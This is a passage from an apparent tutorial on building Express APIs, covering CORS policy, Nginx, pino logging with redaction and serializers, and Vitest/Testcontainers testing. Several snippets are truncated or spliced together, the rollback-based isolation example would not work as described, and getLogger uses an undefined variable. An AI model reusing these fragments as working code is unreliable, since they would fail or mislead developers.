    if (!origin) return callback(null, true)
    if (allowedOrigins.has(origin)) callback(null, true)
    else callback(new Error(`Origin ${origin} not allowed by CORS policy`))
  },
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Request-ID', 'X-CSRF-Token'],
  credentials: true,
  maxAge: 86400,
}

app.use(cors(corsOptions))
app.options('*', cors(corsOptions))
Never combine origin: '*' with credentials: true. Browsers block this because it would mean any website can make authenticated requests on behalf of your logged-in users.

Separate policy for public endpoints

const publicCors  = cors({ origin: '*', methods: ['GET'] })
const privateCors = cors(corsOptions)

app.use('/api/v1/public', publicCors)
app.use('/api/v1',        privateCors)

CORS patterns & pitfalls

Vary: Origin — critical for CDN caching

When you serve different CORS headers for different origins, you must include Vary: Origin in responses. Without it, a CDN may cache a response for origin A and serve it with origin A's CORS headers to origin B. The cors package adds this automatically when you use a function for the origin option.

Subdomain allowlisting — avoid regex

// DANGEROUS — this regex matches evil.example.com.attacker.com
origin: /example\.com$/

// SAFE — explicit Set of only the known good origins
const allowed = new Set(['https://app.example.com', 'https://admin.example.com'])

Testing your CORS policy with curl

# Test a preflight for DELETE with Authorization header
curl -I -X OPTIONS \
  -H 'Origin: https://app.example.com' \
  -H 'Access-Control-Request-Method: DELETE' \
  -H 'Access-Control-Request-Headers: Authorization' \
  https://api.example.com/api/v1/users/123

# Expected response headers:
# Access-Control-Allow-Origin: https://app.example.com
# Access-Control-Allow-Credentials: true
# Access-Control-Max-Age: 86400

Why Nginx in front of Node

Node.js is excellent at running application logic but is not designed to be a front-line internet server. Nginx is purpose-built for that role.

TLS termination
Nginx handles HTTPS, certificate management, and cipher negotiation. Node sees only plain HTTP internally.
Static file serving
Nginx serves static files directly from disk at kernel speed, bypassing Node entirely.
Connection management
Nginx handles thousands of slow or idle connections. It only opens a connection to Node when a request is ready.
Rate limiting
Nginx drops malicious traffic before it reaches your app, independent of Node's load.
Load balancing
Distributes traffic across multiple Node processes to use all CPU cores.
Information hiding
Strips server fingerprinting headers.

Logging philosophy

Logs are how you understand what your application did in the past. Not what it's doing right now (that's metrics), and not why a specific request was slow (that's traces). Logs are the narrative — the discrete events that tell the story of what happened, in what order, with what context.

Three principles that should drive every logging decision:

Log for the person on call at 3am

Every log entry should be actionable or informative to someone who wasn't there when the code was written. If a log requires understanding the codebase to interpret, it's not useful in production. Include context — what was being attempted, who triggered it, what data was involved (safely).

Structure over narrative

A machine needs to search, filter, and aggregate your logs. A human can read JSON. A machine cannot reliably parse natural language strings. Log structured objects, not concatenated messages. The message field is a label; the data fields are the substance.

Cost is a first-class concern

Logging everything at DEBUG in production is as harmful as logging nothing. High log volume costs money in storage and ingestion, increases latency (I/O), and drowns the signal in noise. Make deliberate choices about what gets logged at what level.

Log levels

Pino's levels map to numeric values internally. When you set a log level, all entries below that threshold are silently skipped with zero overhead — no serialization, no I/O. This is why level discipline matters for performance.

LevelValueUse forProduction?
trace10Extremely verbose internal state — function entry/exit, loop iterations. Almost never useful in production.Never
debug20Detailed diagnostic information — query parameters, cache decisions, branching paths. Useful when actively debugging.On-demand only
info30Normal operational events — request received, order created, user logged in. The standard production level.Yes
warn40Something unexpected but recoverable — retry attempted, deprecated API used, rate limit approaching.Yes
error50A failure that affected the user or a system component — request failed, external API down, DB error.Yes
fatal60Process is about to crash — unrecoverable state, startup failure. Use before process.exit().Yes

The distinction between warn and error

The line between warn and error is user impact. If the user got what they asked for despite something going sideways internally — use warn. If the user got an error response, or a background job failed to complete its work — use error. This distinction matters because alerts typically fire on error rate, not warn rate. Blurring them means either noisy alerts or missed failures.

// WARN — retry succeeded, user unaffected
logger.warn({ event: 'email.retry', attempt: 2, orderId }, 'Email delivery retried')

// ERROR — retry exhausted, user's confirmation never arrived
logger.error({ event: 'email.failed', attempts: 3, orderId }, 'Email delivery failed')

// WARN — deprecated endpoint still works
logger.warn({ event: 'api.deprecated', path: req.path }, 'Deprecated route called')

// ERROR — payment gateway timeout, order not completed
logger.error({ event: 'payment.timeout', orderId, userId }, 'Payment gateway unreachable')

Structured logging

Every log entry should be a JSON object with consistent, queryable fields — not a concatenated string. The difference isn't cosmetic: structured logs can be filtered, aggregated, and correlated by machines. Free-text strings cannot.

The wrong way vs the right way

// BAD — string concatenation: unqueryable, no consistent fields
logger.info(`User ${userId} placed order ${orderId} for $${total / 100}`)

// GOOD — structured object: every field is independently queryable
logger.info({
  event:   'order.placed',
  userId,
  orderId,
  total,
  currency: 'usd',
}, 'Order placed')

The second form lets you run queries like: "show me all orders over $500 placed in the last hour by users on the Pro plan" — directly from your log aggregator without writing a regex. The first form makes that query impossible without text parsing.

Logger setup

The logger is a singleton — one instance, shared across the process. It lives in lib/logger.ts and is imported wherever logging is needed. Never create ad-hoc logger instances in feature code.

// lib/logger.ts
import pino from 'pino'
import { config } from '../config/index.js'

export const logger = pino({
  level: config.NODE_ENV === 'production' ? 'info' : 'debug',

  // Rename 'msg' to 'message' — more natural for most log aggregators
  messageKey: 'message',

  // Use ISO timestamps instead of epoch milliseconds
  // Easier to read in log aggregators
  timestamp: pino.stdTimeFunctions.isoTime,

  // Add service identity to every log entry automatically
  base: {
    service: config.SERVICE_NAME ?? 'my-api',
    env:     config.NODE_ENV,
    version: config.SERVICE_VERSION ?? '0.0.0',
  },

  // Development: human-readable colorized output via pino-pretty
  // Production: raw JSON — never use pino-pretty in production,
  //   it adds overhead and is harder to parse
  transport: config.NODE_ENV !== 'production'
    ? {
        target: 'pino-pretty',
        options: {
          colorize:        true,
          translateTime:   'SYS:standard',
          ignore:          'pid,hostname,service,env,version',
        }
      }
    : undefined,
})

Child loggers

A child logger inherits all configuration and base fields from its parent and permanently adds new fields to every entry it produces. This is how you attach request-scoped context — request ID, user ID, trace ID — to all logs within a request without passing a logger instance everywhere.

Creating a child logger per request

// middleware/requestLogger.ts
import { trace } from '@opentelemetry/api'
import { logger } from '../lib/logger.js'
import { randomUUID } from 'crypto'

export function requestLogger(req, res, next) {
  const span    = trace.getActiveSpan()
  const spanCtx = span?.spanContext()

  // Create a child logger for this request — all fields are
  // automatically included on every log made via req.log
  req.log = logger.child({
    requestId: req.id ?? randomUUID(),
    traceId:   spanCtx?.traceId,
    spanId:    spanCtx?.spanId,
    userId:    req.user?.userId ?? null,
  })

  const start = Date.now()
  res.on('finish', () => {
    req.log.info({
      event:  'http.request',
      method: req.method,
      path:   req.route?.path ?? req.path,
      status: res.statusCode,
      ms:     Date.now() - start,
    }, 'Request completed')
  })

  next()
}

AsyncLocalStorage for request context

Passing req.log down through every function call works for small apps but becomes tedious in larger codebases. AsyncLocalStorage — Node's built-in async context mechanism — lets you store the request logger once and retrieve it anywhere in the async call stack without passing it explicitly. It automatically propagates through async/await, Promises, and callbacks.

Context store setup

// lib/context.ts
import { AsyncLocalStorage } from 'async_hooks'
import type { Logger } from 'pino'

interface RequestContext {
  requestId: string
  userId:    string | null
  traceId:   string | undefined
  log:       Logger
}

export const requestContext = new AsyncLocalStorage<RequestContext>()

// Helper to get the current request's logger from anywhere
// Falls back to the root logger if called outside a request context
// (e.g. from a background job or startup code)
export function getLogger(): Logger {
  return requestContext.getStore()?.log ?? rootLogger
}

Middleware that populates the store

// middleware/context.ts
import { requestContext } from '../lib/context.js'
import { logger } from '../lib/logger.js'
import { trace } from '@opentelemetry/api'

export function contextMiddleware(req, res, next) {
  const spanCtx   = trace.getActiveSpan()?.spanContext()
  const requestId = req.id

  const childLog = logger.child({
    requestId,
    traceId: spanCtx?.traceId,
    userId:  req.user?.userId ?? null,
  })

  // Run the rest of the request inside the async context store
  // All code downstream can call getLogger() and get this child logger
  requestContext.run({ requestId, userId: req.user?.userId ?? null,
    traceId: spanCtx?.traceId, log: childLog }, next)
}

Using context in services — no passing required

// features/orders/orders.service.ts
import { getLogger } from '../../lib/context.js'

export async function createOrder(userId: string, input: CreateOrderInput) {
  const log = getLogger()  // gets the request-scoped child logger automatically

  log.info({ event: 'order.create.start', userId, itemCount: input.items.length })

  try {
    const order = await createOrderInDB(userId, input)
    log.info({ event: 'order.create.success', orderId: order.id })
    return order
  } catch (err) {

  }

AsyncLocalStorage propagates automatically through async/await and Promises — no special handling needed. It also propagates into worker threads if you use worker_threads, though you need to pass the store explicitly to the worker at creation time.

Redaction

Pino has first-class support for redacting sensitive fields before they're written. This is safer than relying on developers to manually avoid logging sensitive data — it enforces the rule at the logger level regardless of what gets passed in.

Configuring redaction

// lib/logger.ts
export const logger = pino({
  // ...
  redact: {
    paths: [
      // Auth headers
      'req.headers.authorization',
      'req.headers.cookie',
      'req.headers["x-api-key"]',

      // Request bodies — specific sensitive fields
      'req.body.password',
      'req.body.currentPassword',
      'req.body.newPassword',
      'req.body.creditCard',
      'req.body.cvv',
      'req.body.ssn',

      // User objects that might be logged
      'user.password',
      'user.hashedPassword',

      // Nested sensitive fields using wildcards
      '*.token',
      '*.secret',
      '*.apiKey',
    ],
    censor: '[REDACTED]',   // replace value with this string
  },
})

Testing your redaction config

// Always write a test that verifies redaction actually works
// Redaction misses are security vulnerabilities
it('redacts authorization header in request logs', () => {
  const captured: any[] = []
  const testLogger = pino({ redact: ['req.headers.authorization'] },
    pino.destination({ write: (s) => captured.push(JSON.parse(s)) }))

  testLogger.info({
    req: { headers: { authorization: 'Bearer supersecrettoken' } }
  }, 'test')

  expect(captured[0].req.headers.authorization).toBe('[REDACTED]')
  expect(JSON.stringify(captured[0])).not.toContain('supersecrettoken')
})
Redaction operates on paths — it must know the field name to redact it. A developer who logs { credentials: user } instead of { user } bypasses the redaction config. Redaction is a safety net, not a substitute for developer awareness. Code review should flag any log call that passes an entire user or session object.

Serializers

Serializers transform specific properties before they're written to the log. Where redaction removes values entirely, serializers reshape them — extracting the useful parts of a complex object, formatting values, or trimming verbose structures.

Custom serializers

// lib/logger.ts
export const logger = pino({
  serializers: {
    // Pino's built-in error serializer includes message, type, stack
    // Override to add custom fields or trim the stack trace
    err: (err) => ({
      type:    err.constructor?.name ?? 'Error',
      message: err.message,
      code:    err.code,
      stack:   config.NODE_ENV === 'production'
        ? err.stack?.split('\n').slice(0, 5).join('\n')  // trim in prod
        : err.stack,
    }),

    // Trim the Express req object — the default would log everything
    req: (req) => ({
      method:    req.method,
      url:       req.url,
      path:      req.route?.path,
      requestId: req.id,
      ip:        req.ip,
      userAgent: req.headers?.['user-agent'],
    }),

    // Trim the Express res object
    res: (res) => ({
      statusCode: res.statusCode,
    }),

    // For user objects — never log full user, only identity fields
    user: (user) => ({
      id:   user?.id,
      role: user?.role,
    }),
  },
})

    ignore: (req) => req.url === '/health'
  },
  // Custom log level per status code
  customLogLevel: (req, res, err) => {
    if (res.statusCode >= 500 || err) return 'error'
    if (res.statusCode >= 400)        return 'warn'
    return 'info'
  },
}))

Request logging

Every HTTP request should produce at minimum one log entry when it completes — not when it starts. Logging on completion means you know the outcome (status code, duration) in the same entry. Logging on start requires correlating two entries to understand what happened.

What a good request log looks like

{
  "level":     "info",
  "time":      "2025-09-14T14:32:01.234Z",
  "service":   "my-api",
  "event":     "http.request",
  "message":   "Request completed",
  "requestId": "a3f9b2c1-d4e5-...",
  "traceId":   "a3f9b2c1d4e5f678901234567890abcd",
  "userId":    "user-abc123",
  "method":    "POST",
  "path":      "/api/v1/orders/:id",     // route pattern, not the actual URL
  "status":    201,
  "ms":        245,
  "userAgent": "Mozilla/5.0 ..."
}

Note path is the route pattern (/orders/:id), not the actual URL (/orders/ord-123abc). The actual URL is high-cardinality and pollutes your log aggregator's field index. The pattern lets you group and aggregate by route.

Slow request detection

// In your request logger middleware
res.on('finish', () => {
  const ms = Date.now() - start

  // Upgrade log level for slow requests — makes them findable
  const level = res.statusCode >= 500 ? 'error'
    : res.statusCode >= 400 ? 'warn'
    : ms > 3000              ? 'warn'   // slow but succeeded
    : 'info'

  req.log[level]({
    event:  'http.request',
    method: req.method,
    path:   req.route?.path ?? req.path,
    status: res.statusCode,
    ms,
    slow:   ms > 3000,   // explicit flag for easy filtering
  }, 'Request completed')
})

What to log at each layer

Different layers of the application have different logging responsibilities. Logging the same event at multiple layers creates duplication and noise. Each layer owns specific events.

Middleware — HTTP envelope events

// Request start/completion, auth decisions, rate limit hits
logger.info({  event: 'http.request', method, path, status, ms })
logger.warn({  event: 'auth.unauthorized', path, ip })
logger.warn({  event: 'rate_limit.hit', path, ip })

Controller — nothing, usually

Controllers are so thin that they rarely need their own log entries. The request logger covers the HTTP event; the service logs the business event. If a controller is complex enough to need logging, that's a signal that logic has leaked from the service layer.

Service — business events

// Significant state changes and outcomes — not internal implementation steps
logger.info({ event: 'order.placed',    orderId, userId, total })
logger.info({ event: 'order.cancelled', orderId, userId, reason })
logger.warn({ event: 'payment.retry',   orderId, attempt })
logger.error({ event: 'payment.failed', orderId, err })
Don't log implementation steps

Logging "checking stock", "querying database", "calling email service" as separate entries adds noise without value. Log the outcome, not the journey.

Repository — nothing by default

DB query logging belongs in Prisma's own query log (enabled in the PrismaClient constructor in development) and in your distributed traces (where OTel auto-instrumentation captures every query as a span). Logging queries from repository code duplicates what's already there.

Background jobs / workers

// Workers have no req object — use the root logger with explicit context
logger.info({ event: 'job.start',   jobType, jobId, payload })
logger.info({ event: 'job.success', jobType, jobId, durationMs })
logger.error({ event: 'job.failed', jobType, jobId, err, attempt })

Logging errors

Errors need special care. Pino automatically serializes Error objects when passed under the err key — you get message, type, stack in the output. Always use the err key, not error or e.

The correct pattern

// CORRECT — pass the Error object under the 'err' key
// Pino's built-in serializer expands it automatically
try {
  await ordersService.createOrder(userId, input)
} catch (err) {
  logger.error({
    event:   'order.create.failed',
    err,          // ← the Error object, under the 'err' key
    userId,
    orderId: input.productId,
  }, 'Order creation failed')
  throw err  // re-throw — the error handler will send the HTTP response
}
// WRONG — serializing the error manually, losing the stack trace
logger.error({ message: err.message })         // loses stack, type
logger.error(`Order failed: ${err.message}`)   // loses everything
logger.error({ error: err })                   // wrong key — no serializer

What the serialized error looks like in production logs

{
  "level":   "error",
  "event":   "order.create.failed",
  "userId":  "u1",
  "err": {
    "type":    "ConflictError",
    "message": "Insufficient stock for Widget",
    "code":    "CONFLICT",
    "stack":   "ConflictError: Insufficient stock...\n    at createOrder ..."
  },
  "message": "Order creation failed"
}

Unhandled rejections and exceptions

// index.ts — log these before the process crashes
process.on('unhandledRejection', (reason, promise) => {
  logger.fatal({ event: 'process.unhandledRejection', err: reason },
    'Unhandled promise rejection — shutting down')
  process.exit(1)
})

process.on('uncaughtException', (err) => {
  logger.fatal({ event: 'process.uncaughtException', err },
    'Uncaught exception — shutting down')
  process.exit(1)
})
Log unhandled rejections at fatal level and always exit with a non-zero code. Attempting to recover from an uncaught exception in a Node.js process leaves the process in an undefined state — it's safer to exit and let your process manager (PM2, k8s) restart a clean instance.

Dynamic log levels

One of pino's most useful production features: you can change the log level at runtime without restarting the process. This lets you temporarily enable debug logging on a live production instance to diagnose a specific issue, then return to info level without any downtime.

Runtime level change via signal

// lib/logger.ts — register SIGUSR2 as a level toggle
const LEVELS = ['trace', 'debug', 'info', 'warn', 'error', 'fatal'] as const
let levelIdx = LEVELS.indexOf('info')

process.on('SIGUSR2', () => {
  levelIdx = (levelIdx + 1) % LEVELS.length
  logger.level = LEVELS[levelIdx]
  logger.info({ event: 'logger.level.changed', level: logger.level },
    'Log level changed')
})
# Send SIGUSR2 to the process to cycle log level
kill -USR2 $(pgrep -f "node dist/index.js")

# Or with PM2
pm2 sendSignal SIGUSR2 myapp

Runtime level change via HTTP endpoint

// A protected admin endpoint to change level dynamically
// Only available internally — protected by IP restriction in Nginx
import { z } from 'zod'

app.post('/admin/log-level',
  authenticate,
  authorize('admin'),
  (req, res, next) => {
    try {
      const { level } = z.object({
        level: z.enum(['trace','debug','info','warn','error','fatal'])
      }).parse(req.body)

      const previous = logger.level
      logger.level = level

      logger.info({ event: 'logger.level.changed', previous, level },
        'Log level changed via admin endpoint')

      res.json({ previous, current: logger.level })
    } catch (err) { next(err) }
  }
)
Dynamic debug logging in production can expose sensitive data if your debug statements log full objects. Before enabling debug in production, audit what your debug-level calls log. It's safer to use trace/debug for timing and path information only, never for data payloads.

stdout and log collectors

In containerized environments (Docker, Kubernetes), the correct pattern is to write logs to stdout and let the container runtime and a dedicated log collector handle shipping. This is not optional — writing logs to files inside a container creates operational headaches and goes against the twelve-factor app principle.

Your Node process's only responsibility is writing valid JSON to stdout. Everything after that — buffering, batching, routing, shipping — is the collector's job. This separation means you can change your log backend without touching application code.

Retention & cost

Log volume is a cost centre. At scale, logging everything at debug level in production can cost more than your database. Retention policies, log levels, and sampling are your tools for managing this.

Volume estimation

# Rough calculation for a moderately active API:
# 100 req/s × 1 log entry/req × 500 bytes/entry
# = 50 KB/s = 4.3 GB/day = ~130 GB/month

# Each additional log level (debug, trace) multiplies this.
# At 10 debug entries per request: 1.3 TB/month

# Typical ingestion pricing: $0.10–0.50/GB
# 130 GB/month = $13–65/month at info level
# 1.3 TB/month = $130–650/month at debug level

Tiered retention strategy

Log typeRetentionRationale
Error + fatal90 daysNeeded for incident post-mortems and patterns over time
Security events (auth, authz)1 yearCompliance and forensics — may be legally required
Info (request logs, business events)30 daysMost debugging happens within days of an incident
Warn30 daysSame as info
Debug (if enabled)7 daysShort-term diagnostic data — high volume, transient value

Reducing volume without losing signal

// Strategy 1: Only log request completions, not starts
// (halves HTTP log volume immediately)
res.on('finish', () => logger.info({ ... }))   // ✓ log once, on completion
// vs:
logger.info('Request received')                // ✗ adds a second entry per request

// Strategy 2: Log slow or failed requests at higher verbosity
// Fast successful requests get minimal info; slow/failed get full context
const level = ms > 2000 || res.statusCode >= 400 ? 'warn' : 'info'
req.log[level]({ event: 'http.request', method, path, status, ms })

// Strategy 3: Sample high-frequency background events
let bgJobCount = 0
function shouldLogBgJob() {
  bgJobCount++
  return bgJobCount % 100 === 0  // log 1 in 100 routine job completions
}
The highest-impact single change for log cost reduction is usually removing debug-level database query logging from production. Prisma's ['query'] log option produces one entry per DB call — at 10 queries per request and 100 req/s, that's 1,000 entries per second of pure infrastructure noise.

Testing philosophy

Tests have one job: give you confidence that the system behaves correctly, and tell you quickly when it doesn't. Everything else — coverage numbers, test counts, mocking style — is in service of that goal. A test suite that passes while the system is broken is worse than no tests at all; it's actively misleading.

Two principles guide every decision in this section:

Test behaviour, not implementation

A test should verify what the code does, not how it does it. If you can refactor the internals without changing any tests, your tests are testing the right things. If every refactor breaks tests, your tests are coupled to implementation details — they're slowing you down without providing safety.

Test at the lowest useful layer

Unit tests are fast and precise. Integration tests are slower but catch more realistic failure modes. Use unit tests to cover edge cases exhaustively. Use integration tests to verify that the layers connect correctly. Don't duplicate coverage — if a unit test already covers a branch, the integration test doesn't need to exercise it again.

What this means for Express apps specifically

The router/controller/service separation gives you a natural testing strategy. Controllers are thin enough that they barely need unit tests — they're better covered by integration tests that exercise the full HTTP stack. Services contain the logic and should be unit tested exhaustively. Repositories are better tested against a real database (via Testcontainers) than mocked, because the behaviour you care about — query correctness, constraint violations, transaction rollback — can't be verified with a mock.

Test pyramid

The test pyramid describes the right distribution of test types. More unit tests than integration tests, more integration tests than E2E tests. The further up the pyramid, the slower, more brittle, and more expensive tests become — so you write fewer of them and rely on them for less.

TypeWhat it testsSpeedTools
UnitService logic, validation, utilities — in isolation with mocked dependencies~1ms/testVitest
IntegrationRoutes, controllers, repositories — with real HTTP and real database~50–200ms/testVitest + supertest + Testcontainers
E2ECritical user flows end-to-end through a running app~1–10s/testPlaywright

What to skip

Don't test framework internals. Express routing, Prisma query building, Zod parsing — these all have their own test suites. Test the code you wrote, not the libraries you're using.

NOT worth testing

That express.json() parses JSON bodies, that Zod rejects a null value when the schema says string, that Prisma generates correct SQL. These are library responsibilities.

Worth testing

That your service throws ConflictError when stock is 0. That your auth middleware rejects a missing Bearer token with 401. That your route returns 422 with a structured error body when the request body is invalid.

Testing services

Service tests are the core of your unit test suite. The service contains all your business rules — every conditional, every domain constraint, every error path. Test all of them. Because the repository is mocked, these tests run in milliseconds and can be exhaustive.

The AAA structure — Arrange, Act, Assert

// features/orders/orders.unit.test.ts
import { describe, it, expect, vi, beforeEach } from 'vitest'
import { createOrder, cancelOrder } from './orders.service.js'
import * as ordersRepo   from './orders.repository.js'
import * as productsRepo from '../products/products.repository.js'
import { NotFoundError, ConflictError, ForbiddenError } from '../../lib/errors.js'

vi.mock('./orders.repository.js')
vi.mock('../products/products.repository.js')

const mockProduct = { id: 'p1', name: 'Widget', price: 1000, stock: 10 }
const mockOrder   = { id: 'o1', userId: 'u1', total: 2000, status: 'PENDING' }

beforeEach(() => {
  vi.clearAllMocks()
  vi.mocked(productsRepo.findById).mockResolvedValue(mockProduct)
  vi.mocked(ordersRepo.createWithItems).mockResolvedValue(mockOrder)
})

describe('createOrder', () => {
  const input = { items: [{ productId: 'p1', quantity: 2, unitPrice: 1000 }] }

  it('creates order and returns it', async () => {
    // Arrange (done in beforeEach)
    // Act
    const order = await createOrder('u1', input)
    // Assert
    expect(order).toEqual(mockOrder)
    expect(ordersRepo.createWithItems).toHaveBeenCalledWith(
      'u1', input, 2000, expect.anything()  // tx arg
    )
  })

    await createOrder('u1', input)
    expect(productsRepo.decrementStock).toHaveBeenCalledWith('p1', 2, expect.anything())
  })

  it('throws NotFoundError when product does not exist', async () => {
    vi.mocked(productsRepo.findById).mockResolvedValue(null)
    await expect(createOrder('u1', input)).rejects.toThrow(NotFoundError)
  })

  it('throws ConflictError when stock is insufficient', async () => {
    vi.mocked(productsRepo.findById).mockResolvedValue({ ...mockProduct, stock: 1 })
    await expect(createOrder('u1', input)).rejects.toThrow(ConflictError)
  })

  it('calculates total correctly across multiple items', async () => {
    const multiInput = {
      items: [
        { productId: 'p1', quantity: 2, unitPrice: 1000 },
        { productId: 'p1', quantity: 1, unitPrice: 500 },

describe('cancelOrder', () => {
  it('throws NotFoundError when order does not exist', async () => {
    vi.mocked(ordersRepo.findById).mockResolvedValue(null)
    await expect(cancelOrder('o1', 'u1')).rejects.toThrow(NotFoundError)
  })

  it('throws ForbiddenError when user does not own the order', async () => {

    vi.mocked(ordersRepo.findById).mockResolvedValue({ ...mockOrder, status: 'SHIPPED' })
    await expect(cancelOrder('o1', 'u1')).rejects.toThrow(ConflictError)
  })

  it('updates status to CANCELLED on success', async () => {
    vi.mocked(ordersRepo.findById).mockResolvedValue(mockOrder)
    await cancelOrder('o1', 'u1')

Clear mocks in beforeEach, not afterEach. Clearing before each test ensures a clean state even if a previous test threw an unexpected error before reaching its cleanup. vi.clearAllMocks() resets call history and return values; vi.resetAllMocks() also removes implementations; vi.restoreAllMocks() restores original implementations — use the least powerful one that meets your needs.

Mocking in ESM

Mocking in ESM is more constrained than CommonJS. Because ESM bindings are live and read-only, you cannot simply reassign an imported function. Vitest handles this via module interception — but there are important rules to follow.

The hoisting requirement

// vi.mock() calls are hoisted to the top of the file by Vitest
// even if you write them after imports. This is intentional —
// the mock must be registered before the module is imported.

// This works — Vitest hoists the vi.mock call automatically:
import { createOrder } from './orders.service.js'
import * as ordersRepo from './orders.repository.js'

vi.mock('./orders.repository.js')   // hoisted above the imports at runtime

// The path must be the same string used in the source file,
// not a resolved absolute path.

Mocking with a factory — full control over the mock shape

// Provide a factory function for full type-safe mock control
vi.mock('./orders.repository.js', () => ({
  findById:        vi.fn(),
  createWithItems: vi.fn(),
  updateStatus:    vi.fn(),
  findByUser:      vi.fn(),
}))

// In the test — override individual functions per test
vi.mocked(ordersRepo.findById).mockResolvedValue(mockOrder)
vi.mocked(ordersRepo.findById).mockRejectedValue(new Error('DB error'))
vi.mocked(ordersRepo.findById).mockResolvedValueOnce(null)   // first call returns null

vi.spyOn — for partial mocking

// When you want to keep the real implementation but watch calls
// or override specific scenarios
import * as crypto from '../../lib/crypto.js'

it('calls hashPassword during user creation', async () => {
  const spy = vi.spyOn(crypto, 'hashPassword').mockResolvedValue('$hashed')
  await usersService.createUser({ email: 'a@a.com', password: 'plain' })
  expect(spy).toHaveBeenCalledWith('plain')
})

Mocking modules that use default exports

// For modules with a default export:
vi.mock('../../lib/logger.js', () => ({
  default: {
    info:  vi.fn(),
    warn:  vi.fn(),
    error: vi.fn(),
    child: vi.fn().mockReturnThis(),
  }
}))

The ESM gotcha — why spyOn sometimes fails

// This FAILS in ESM — you cannot reassign a named export binding
import * as service2 from './service2.js'
service2.myFunc = vi.fn()   // TypeError: Cannot assign to read only property

// This WORKS — vi.spyOn uses property descriptor tricks
vi.spyOn(service2, 'myFunc').mockImplementation(() => 'mocked')

// This ALSO WORKS — module-level mock via vi.mock()
vi.mock('./service2.js')
vi.mock() works in all ESM scenarios. vi.spyOn() works for object property mocking. Direct reassignment of imported bindings never works in ESM — it will throw a TypeError at runtime.

Testing error paths

Error paths are the most under-tested part of most codebases. They're also the most likely to cause incidents — the happy path is exercised constantly in development; error paths often aren't tested until production. Be systematic about it.

Testing thrown errors — type and message

// Test both type and message together
await expect(createOrder('u1', input)).rejects.toMatchObject({

  code:       'NOT_FOUND',

// For synchronous throws

describe('errorHandler', () => {
  it('returns 404 for NotFoundError', () => {
    const res = mockRes()
    errorHandler(new NotFoundError(), mockReq, res, mockNext)
    expect(res.status).toHaveBeenCalledWith(404)
    expect(res.body).toMatchObject({ code: 'NOT_FOUND' })
  })

  it('returns 422 with flattened errors for ZodError', () => {
    const { z } = require('zod')
    const zodErr = z.object({ email: z.string().email() }).safeParse({ email: 'bad' }).error
    const res = mockRes()
    errorHandler(zodErr, mockReq, res, mockNext)
    expect(res.status).toHaveBeenCalledWith(422)
    expect(res.body.code).toBe('VALIDATION_ERROR')
    expect(res.body.errors).toBeDefined()
  })

  it('returns 500 and does not expose details for unknown errors', () => {
    const res = mockRes()
    errorHandler(new Error('internal db connection string'), mockReq, res, mockNext)
    expect(res.status).toHaveBeenCalledWith(500)
    expect(res.body.code).toBe('INTERNAL_ERROR')
    // CRITICAL: internal error message must not leak to client
    expect(JSON.stringify(res.body)).not.toContain('db connection string')
  })
})
That last test — asserting that internal error details don't appear in the response body — is one of the most valuable tests you can write for security. It will catch accidental changes to the error handler that start leaking database errors or stack traces to clients.

Auth in tests

Auth is the most awkward part of integration testing because you need valid tokens to reach protected routes. There are two approaches: generate real tokens using the same utilities your app uses, or stub the auth middleware. The first is strongly preferred — stubbing auth means you're not testing auth enforcement at all.

Database testing

Mocking the repository lets you test services in isolation, but it can't tell you whether your queries are actually correct. A mock that returns whatever you tell it to will never catch a missing index, a constraint violation you forgot to handle, or a transaction that doesn't roll back correctly. For that you need a real database.

The three approaches

ApproachProsCons
Mock repositoriesFast, no infrastructure neededDoesn't test queries, misses constraint errors
Shared dev DBSimple setupTests pollute each other, non-reproducible
TestcontainersReal DB, isolated, reproducibleSlower, requires Docker

The right answer is both: mock repositories for unit tests covering service logic, and Testcontainers for repository tests covering query correctness. Don't try to use one approach for both.

What to test at the repository layer

Test these against a real DB

Unique constraint violations (does the DB enforce them?), foreign key constraints, transaction rollback on failure, query result shape, cursor pagination correctness, index usage (via EXPLAIN).

Don't test these against a real DB

Business rules — those belong in service unit tests. HTTP contract — that belongs in integration tests. You're testing SQL here, not logic.

Testcontainers

Testcontainers spins up a real Postgres container per test run. Each test file gets its own database — schema migrations run fresh, and there's no state shared between files. The tradeoff is speed: container startup adds 5–15 seconds per test suite.

The critical Vitest parallelism problem

Vitest runs test files in parallel by default. If all integration tests share one container and one database, a test in file A might truncate tables while file B is mid-test. The solution is to give each test file its own isolated database within a shared container — one container starts globally, each file creates a unique database inside it.

Global setup — vitest.global-setup.ts

// src/tests/helpers/database.ts
import { inject } from 'vitest'
import { Client } from 'pg'
import { execSync } from 'child_process'
import { randomUUID } from 'crypto'

export async function createTestDatabase() {
  const info = inject('POSTGRES_HOST') ? {
    host:     inject('POSTGRES_HOST'),
    port:     inject('POSTGRES_PORT'),
    database: inject('POSTGRES_DATABASE'),
    user:     inject('POSTGRES_USERNAME'),
    password: inject('POSTGRES_PASSWORD'),
  } : null

  if (!info) throw new Error('Global setup did not provide DB connection info')

  // Create a unique database for this test file
  const dbName = `test_${randomUUID().replace(/-/g, '_')}`
  const admin  = new Client({ ...info })
  await admin.connect()
  await admin.query(`CREATE DATABASE ${dbName}`)
  await admin.end()

  const dbUrl = `postgresql://${info.user}:${info.password}@${info.host}:${info.port}/${dbName}`

  // Run Prisma migrations against this fresh database
  process.env.DATABASE_URL = dbUrl
  execSync('npx prisma migrate deploy', { env: { ...process.env, DATABASE_URL: dbUrl } })

  return { dbUrl, dbName, adminInfo: info }
}

export async function dropTestDatabase(dbName: string, adminInfo: any) {
  const admin = new Client(adminInfo)
  await admin.connect()
  await admin.query(`DROP DATABASE IF EXISTS ${dbName}`)
  await admin.end()
}

Test isolation

Tests must be independent — the result of one test should never affect another. This is the most common source of flaky tests: a test that passes in isolation but fails when run after a different test.

Mock isolation — clearAllMocks in beforeEach

// BAD — mock state from one test leaks into the next
describe('suite', () => {
  vi.mocked(repo.findById).mockResolvedValue(mockOrder)  // set once
  it('test 1', async () => { /* uses mock */ })
  it('test 2', async () => {
    // might see leftover call count from test 1
    expect(repo.findById).toHaveBeenCalledTimes(1)  // fragile!
  })
})

// GOOD — clean state before each test
beforeEach(() => {
  vi.clearAllMocks()                                      // reset call history
  vi.mocked(repo.findById).mockResolvedValue(mockOrder)  // re-establish defaults
})

Database isolation — clean state strategies

// Strategy 1: TRUNCATE between tests (fast, same DB)
// Wrap in a transaction and roll back — no cleanup needed
describe('suite', () => {
  let tx: any
  beforeEach(async () => {
    tx = await prisma.$transaction(async (t) => t, { timeout: 10000 })
  })
  afterEach(async () => {
    await prisma.$executeRaw`ROLLBACK`  // roll back all writes from this test
  })
})

